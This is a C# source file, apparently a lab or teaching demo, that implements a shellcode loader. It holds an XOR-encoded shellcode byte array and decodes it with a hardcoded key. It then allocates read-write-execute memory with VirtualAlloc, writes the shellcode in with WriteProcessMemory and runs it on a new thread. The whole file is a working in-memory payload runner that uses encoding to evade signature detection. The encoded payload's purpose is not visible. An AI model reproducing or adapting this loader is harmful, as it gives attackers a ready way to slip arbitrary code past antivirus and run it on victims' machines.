using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);


        static void Main()
        {
            Console.WriteLine("Press Any Key to continue");
            Console.ReadKey();
            // (1) insert our shellcode
            byte[] encodedData = new byte[] { 0x25, 0x48, 0xba, 0x2d, 0xe2, 0x9b, 0xb2, 0x8b, 0x94, 0x9a, 0x31, 0xe0, 0x7c, 0x9c, 0x9a, 0x9c, 0x8d, 0x2d, 0xcf, 0xf7, 0x76, 0xa3, 0x93, 0x88, 0x14, 0xfe, 0xe1, 0x3a, 0x54, 0x2c, 0x4c, 0x2d, 0x54, 0x95, 0x86, 0x8c, 0x9a, 0x81, 0x86, 0x05, 0x2f, 0x30, 0x7f, 0x78, 0xf5, 0x1d, 0x0e, 0x11, 0xbc, 0xa8, 0x9b, 0x85, 0x4d, 0xaf, 0xba, 0xa1, 0x38, 0xf8, 0xcd, 0xda, 0x24, 0x2c, 0x93, 0xbf, 0xfd, 0xf1, 0xf3, 0xc0, 0x9f, 0xac, 0xf9, 0xa6, 0xfd, 0xfc, 0xb5, 0xd9, 0x2f, 0x3f, 0xb3, 0x64, 0x04, 0xe9, 0xc4, 0x9b, 0xa4, 0xba, 0xad, 0xad, 0x4f, 0x63, 0x21, 0xa8, 0x65, 0x95, 0xe5, 0xc4, 0x58, 0xfe, 0x46, 0x55, 0x13, 0xa9, 0xe6, 0x3e, 0x83, 0x52, 0xd8, 0xdb, 0x53, 0xaa, 0x64, 0xb7, 0x40, 0x34, 0xdf, 0xbf, 0x4a, 0xee, 0x39, 0x9f, 0xeb, 0xcf, 0x9f, 0x89, 0x00, 0xf7, 0x75, 0x8b, 0x67, 0xb1, 0x9b, 0x03, 0x8a, 0x6a, 0xf1, 0xf9, 0x70, 0xe0, 0x1e, 0x45, 0x78, 0x99, 0xb3, 0xf0, 0xba, 0x22, 0xd3, 0x8a, 0x45, 0xba, 0x7d, 0xb7, 0x56, 0xea, 0x92, 0x58, 0xf7, 0xa8, 0xac, 0xdf, 0xbf, 0xe6, 0x6a, 0x5d, 0x5f, 0x7d, 0xcf, 0x67, 0x3e, 0xb8, 0x5a, 0xdc, 0x22, 0x30, 0xa6, 0x24, 0xb7, 0xae, 0x21, 0xd5, 0x05, 0x28, 0xdf, 0x08, 0x0d, 0x4e, 0xcb, 0x9f, 0x52, 0xcc, 0xef, 0xba, 0x58, 0x6e, 0xff, 0x42, 0x5a, 0xa6, 0x64, 0xa5, 0x44, 0xf6, 0x9c, 0x53, 0x64, 0xae, 0x62, 0xf5, 0x22, 0xf3, 0x0c, 0xc2, 0x1e, 0xb1, 0xf1, 0x29, 0x26, 0x3a, 0x9f, 0x00, 0x4b, 0xba, 0xb0, 0xa1, 0x2e, 0xf1, 0xd3, 0x84, 0xdc, 0xa4, 0xba, 0xa9, 0x2b, 0xf0, 0xda, 0xc8, 0x5d, 0x7d, 0x1a, 0xd7, 0x37, 0xf1, 0x6c, 0x68, 0x4c, 0xbf, 0xb8, 0xb4, 0x3e, 0x25, 0x87, 0x7d, 0x55, 0x09, 0x04, 0x10, 0x2b, 0x51, 0x87, 0x94, 0x13, 0xf0, 0x92, 0x96, 0x1b, 0xd1, 0xbe, 0xa6, 0x2a, 0x8d, 0x8b, 0x84, 0x78, 0xe6, 0xc6, 0x26, 0x52, 0x9f, 0xc1, 0xf8, 0x9e, 0x6a, 0xc3, 0x5d, 0xc3, 0xe2, 0xef, 0xe5, 0x60, 0x57, 0x85, 0x83, 0x02, 0xef, 0xba, 0x8c, 0x09, 0xd4, 0xe2, 0xf1, 0x71, 0x9e, 0x85, 0x95, 0x47, 0xf4, 0xe3, 0xed, 0x69, 0x97, 0x85, 0x90, 0x1f, 0xc6, 0xbb, 0xbf, 0x25, 0xfe, 0xa1, 0x19, 0x66, 0xa9, 0x9b, 0x92, 0x56, 0x8c, 0x9f, 0x9a, 0x05, 0xcc, 0xfd, 0xcb, 0x5b, 0xac, 0xa4, 0xee, 0x37, 0xf6, 0xdd, 0xa5, 0xd7, 0xb7, 0x41, 0xaa, 0xf5, 0xef, 0x8b, 0x6b, 0xc6, 0xb8, 0xd6, 0x2c, 0x3f, 0x19, 0x7d, 0x21, 0xa6, 0xbf, 0x18, 0x3d, 0x78, 0xbf, 0x87, 0x9c, 0x1e, 0xe8, 0xe7 };

            // Print the shellcode to the screen
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] Encoded Shellcode Size: " + encodedData.Length);
            Process currentProcess = Process.GetCurrentProcess();
            Console.WriteLine("[+] Process Name: " + currentProcess.ProcessName);
            Console.WriteLine("[+] Process ID: " + currentProcess.Id);

            string xorKey = "mysecretkey";

            // Decoding process
            byte[] decodedData = new byte[encodedData.Length];
            for (int i = 0; i < encodedData.Length; i++)
            {
                decodedData[i] = (byte)(encodedData[i] ^ xorKey[i % xorKey.Length]);
            }

            StringBuilder decodedHex = new StringBuilder();
            for (int i = 0; i < decodedData.Length; i++)
            {
                decodedHex.AppendFormat(i < decodedData.Length - 1 ? "0x{0:x2}, " : "0x{0:x2}", decodedData[i]);
            }

            Console.WriteLine("Decoded Data: " + decodedHex.ToString());

    // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)decodedData.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Console.WriteLine("Press Any Key to continue");
            Console.ReadKey();
            Console.WriteLine("[+] Memory Allocated with RWX permission for shellcode!!! ");

            // (3) inject shellcode into allocated memory
            //Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);
            Console.WriteLine("[+] Memory Location: " + funcAddr);
            Console.WriteLine("[+] Memory Location HEX: 0x" + funcAddr.ToInt64().ToString("X"));

            IntPtr bytesWritten;
            bool result = WriteProcessMemory(currentProcess.Handle, funcAddr, decodedData, (uint)decodedData.Length, out bytesWritten);
            Console.WriteLine("[+] Shellcode Injected into memory of current process!!! ");
            Console.WriteLine("Press Any Key to create thread to start Shellcode");
            Console.ReadKey();

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}